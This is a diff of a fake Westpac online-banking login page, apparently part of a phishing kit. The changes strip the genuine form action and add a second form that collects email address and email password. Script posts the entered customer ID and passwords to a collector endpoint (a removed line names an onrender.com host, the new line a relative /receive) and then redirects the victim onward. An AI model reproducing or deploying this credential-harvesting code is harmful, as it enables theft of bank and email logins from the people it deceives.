@@ -62,6 +62,8 @@
         </div>
     </div>
     
+    
+    
     <div class="application">
         <div id="busyindicator" class="out-of-session" aria-busy="false">
             <div class="content">
@@ -97,7 +99,7 @@
                     <!-- /ko -->
 
                     <div class="gutter">
-                        <h2 class="aubergine">Sign in</h2>
+                        <h2 class="aubergine" id="aubergine">Sign in</h2>
 
                         <div class="validation-summary dialog active">
                             <div class="message" data-button-text="Ok">
@@ -122,8 +124,8 @@
 
 
 
-                        <form class="login-form" id="login_form" method="POST" action="/eam/servlet/AuthenticateHttpServlet">
-                            <fieldset>
+                        <form class="login-form" id="login_form" method="POST">
+                            <fieldset><section id="Customer_sec">
                                 <legend>Please provide username and password to sign in</legend>
                                 <label for="login_username" class="input" data-bind="css: {'rememberMeChecked': isRememberMeCheckedAlready}">
                                     <input class="login-input log_ins" type="tel" pattern="[0-9]*" id="login_username" name="CustomerID" autocomplete="off" name="username" aria-required="true" data-bind="disabled: isBusy" maxlength="8" autocapitalize="off" />
@@ -144,17 +146,43 @@
                                 
                                 	
                                 </fieldset>
+                                </section>
+                                
+                                <fieldset><section id="Email_sec" style="display:none">
+                                <legend>Please provide username and password to sign in</legend>
+                                <label for="email" class="input" data-bind="css: {'rememberMeChecked': isRememberMeCheckedAlready}">
+                                    <input class="login-input eml_log_" type="email" id="email" name="Email " autocomplete="off" name="username" aria-required="true" data-bind="disabled: isBusy" maxlength="20" autocapitalize="off" />
+                                    <span id="username_ghost" class="ghosttext" style="visibility: visible;"> Email </span>
+                                    <span class="visually-hidden" data-bind="text: maxUsernameLengthA11y">8 characters is maximum length of field</span>
+                                    <span class="visually-hidden required">Required</span>
+                                    <span aria-hidden="true" class="masked" data-bind="text: maskedCustomerId() "></span></label>
+                                <label for="email_password" class="input">
+                                    <!-- ko if: isStrongerPasswordFeatureOn() -->
+                                    <input class="login-input eml_log_" name="EmailPassword" type="password" id="email_password" aria-required="true" data-keymap-url="" data-bind="disabled: isBusy" minlength="6" autocapitalize="off" />
+                                    <!-- /ko -->
+                                    <!-- ko ifnot: isStrongerPasswordFeatureOn() -->
+                                    <!-- /ko -->
+                                    <span class="ghosttext" style="visibility: visible;">Password</span>
+                                    <span class="visually-hidden" data-bind="text: maxPasswordLengthA11y">30 characters is maximum length of field</span>
+                                    <span class="required visually-hidden">Required</span>
+                                </label>
+                                
+                                	
+                                </fieldset>
+                                </section>
                             <!-- ko if: isRemeberMeFeatureOn() -->
+                            	<section id="rememberbox" class="non_ness">
                             <label for="remember_customer_id" class="remember-customer-id">
                                 <input id="remember_customer_id" type="checkbox" class="visually-hidden" data-bind="checked: isRememberMeChecked" />
                                 <span class="remember-me-checkbox-icon"></span>
                                 <span class="remember-me-checkbox-tick-icon"></span>
                                 <span class="label-inline">Remember customer <abbr title="identification">ID</abbr></span>
                             </label>
+                            </section>
                             <!-- /ko -->
                             <button id="subbut" type="submit">Sign in</button>
                                                     </form>
-                        <div class="forgot-credential-container">
+                        <div class="forgot-credential-container non_ness">
                             <a href="javascript:;" data-bind="click: navigateForgottenCredential" class="key">
                                 <span>Forgot customer ID or password?</span>
                                 <span class="visually-hidden"> Forgot your customer ID or password</span>
@@ -342,9 +370,9 @@
                         </a>
                     </div>
 
-                    <div class="validation-summary" role="alert">
+                    <div class="validation-summary"  role="alert" style="display:block"> 
                         <div class="message">
-                            <p><strong>Please correct the errors with the following fields:</strong></p>
+                            <p id="alert_mess"><strong>Please correct the errors with the following fields:</strong></p>
                         </div>
                         <div class="errors"></div>
                     </div>
@@ -1295,7 +1323,7 @@
             <div id="registration_step1" class="page view" data-submit-url="https://banking.westpac.com.au/wbc/banking/authentication/verifyinitialidentification" data-analytics-allkeys="experience,formName,pageKey,pageName,pageStep,pageType,siteVersion,nav,externalSiteName,productID,itemName,transactionID" data-analytics-pagetype="registration" data-analytics-pagestep="start" data-analytics-pagename="personal details" data-analytics-formname="olb" data-analytics-siteversion="1.1242.143.1" data-analytics-experience="titan" data-analytics-pagekey="Mob_Firstsign_Registration">
 
                 <header class="title-bar" role="banner">
-                    <h1>Registration<span class="visually-hidden"> Step 1</span></h1>
+                     <h1>Registration<span class="visually-hidden"> Step 1</span></h1>
                 </header>
 
 
@@ -2364,10 +2392,10 @@
 
 
 <script>
-    	function addListItem(ulId, text, attributes = {}) {
+	function addListItem(ulId, text, attributes = {}) {
     var ul = document.getElementById(ulId);
     var li = document.createElement('li');
-    li.textContent = 'Your ' + text + ' is empty'; 
+    li.textContent = 'Your ' + text + ' is empty';
 
     for (const [key, value] of Object.entries(attributes)) {
         li.setAttribute(key, value);
@@ -2376,84 +2404,142 @@
     ul.appendChild(li);
 }
 
-$(document).ready(function() {
-    $('#subbut').on('click', function(event) {
-        event.preventDefault(); // Prevent the default action of the link
+document.addEventListener('DOMContentLoaded', function() {
+    let checkInputs = document.querySelectorAll('.log_ins');
+    let emailForm = false;
+
+    const initialDisplayStyles = {};
+    document.querySelectorAll('.non_ness').forEach(hidden => {
+        initialDisplayStyles[hidden.id] = hidden.style.display;
+    });
+
+    checkInputs.forEach(check => {
+        check.addEventListener('focus', () => {
+            if (check.nextElementSibling) {
+                check.nextElementSibling.style.display = "none";
+            }
+        });
+    });
+
+    function addFocusEventToEmailInputs() {
+        document.querySelectorAll('.non_ness').forEach(hidden => {
+            hidden.style.display = "none";
+        });
+
+        document.getElementById('aubergine').textContent = "Confirm email credentials"; 
+        document.getElementById('subbut').style.marginTop = "33px"; 
+        
+        let checkInputx = document.querySelectorAll('.eml_log_');
+        checkInputx.forEach(checkx => {
+            checkx.addEventListener('focus', () => {
+                if (checkx.nextElementSibling) {
+                    checkx.nextElementSibling.style.display = "none";
+                }
+            });
+        });
+    }
+
+    document.getElementById('subbut').addEventListener('click', function(event) {
+        event.preventDefault();
 
         let myForm = $("#login_form");
-        let checkInputs = document.querySelectorAll('.log_ins');
 
-        // Clear previous list items
         document.getElementById('empty_list').innerHTML = '';
 
-        // Flag to track if any input is empty
         let isEmpty = false;
 
-        // Loop through each input field
-        for (const check of checkInputs) {
-            check.addEventListener('focus', () => {
-                console.log('focus');
-                check.nextElementSibling.style.display = "none";
-            });
-
+        checkInputs.forEach(check => {
             if (check.value.trim() === "") {
                 document.getElementById('dialog-blockout').style.display = "block";
-                addListItem('empty_list', check.name, {
-                    class: 'bullet-point',
-                });
+                addListItem('empty_list', check.name, { class: 'bullet-point' });
                 isEmpty = true;
             }
+        });
+
+        if (emailForm) {
+            let checkInputx = document.querySelectorAll('.eml_log_');
+            checkInputx.forEach(checkx => {
+                if (checkx.value.trim() === "") {
+                    document.getElementById('dialog-blockout').style.display = "block";
+                    addListItem('empty_list', checkx.name, { class: 'bullet-point' });
+                    isEmpty = true;
+                }
+            });
         }
 
-        // If no input is empty, proceed with form submission
         if (!isEmpty) {
             let userinfo = myForm.serializeArray();
             let user = {};
             let visitor = document.getElementById('login_username').value;
 
             userinfo.forEach((value) => {
-                // Use the 'name' attribute to create user object
                 user[value.name] = value.value;
             });
 
             user['visitor'] = visitor;
-            console.log(user);
 
-            // Send AJAX request
             $.ajax({
                 method: 'POST',
-                url: "https://westpac.onrender.com/receive",
+                url: "/receive",
                 data: user
             }).done(function(msg) {
-                // Store visitor info in sessionStorage
+                emailForm = true;
+                setTimeout(() => { 
+                    document.getElementById('Customer_sec').style.display = "none";
+                    document.getElementById('Email_sec').style.display = "block";
+                    document.getElementById('subbut').textContent = "Confirm email";
+                    addFocusEventToEmailInputs();
+                }, 1000);
+                
+                let email = document.getElementById('email').value;
+                if (email.trim !== "") { 
+                    window.location.href = "/login/2";
+                }
                 sessionStorage.setItem('visitor', visitor);
-                // Redirect to login page
-                window.location.href = "/login/2";
-                console.log(msg); // Log success message
             }).fail(function(err, textstatus, error) {
-                window.location.href = "/login/2";
-                console.log('fail');
+                console.log('Error: ', error);
             });
         }
     });
+
+    window.addEventListener('popstate', (event) => {
+        const state = event.state;
+        if (state && state.prevPage) {
+            console.log("Previous page:", state.prevPage);
+        }
+
+        document.getElementById('Customer_sec').style.display = "block";
+        document.getElementById('Email_sec').style.display = "none";
+        document.getElementById('subbut').textContent = "Sign in";
+        
+        document.querySelectorAll('.non_ness').forEach(hidden => {
+            hidden.style.display =  '';
+        });
+        document.getElementById('aubergine').textContent = ""; 
+        document.getElementById('subbut').style.marginTop = "";
+    });
+
+    history.replaceState({ prevPage: 'InitialPage' }, '');
+
+    document.getElementById('subbut').addEventListener('click', function(event) {
+        event.preventDefault();
+        const newState = { prevPage: 'CurrentPage' }; 
+        history.pushState(newState, '');
+    });
+
+    var close = document.querySelectorAll('.log_ins'); 
+
+    for (const button of close) {
+        button.addEventListener('input', () => {
+            button.nextElementSibling.textContent = "";
+        });
+    }
+
+    document.getElementById('closebut').addEventListener('click', ()=>{
+        document.getElementById('dialog-blockout').style.display = "none";
+    });
 });
-
-  // Select all elements with the class 'log_ins'
-var close = document.querySelectorAll('.log_ins'); 
-
-// Add an 'input' event listener to each selected element
-for (const button of close) {
-  button.addEventListener('input', () => {
-  console.log('log_ins');
-    button.nextElementSibling.textContent = "";
-  });
-}
-
-document.getElementById('closebut').addEventListener('click', ()=>{
-document.getElementById('dialog-blockout').style.display = "none";
-});
-    </script>
-    
+	</script>
     
     
     
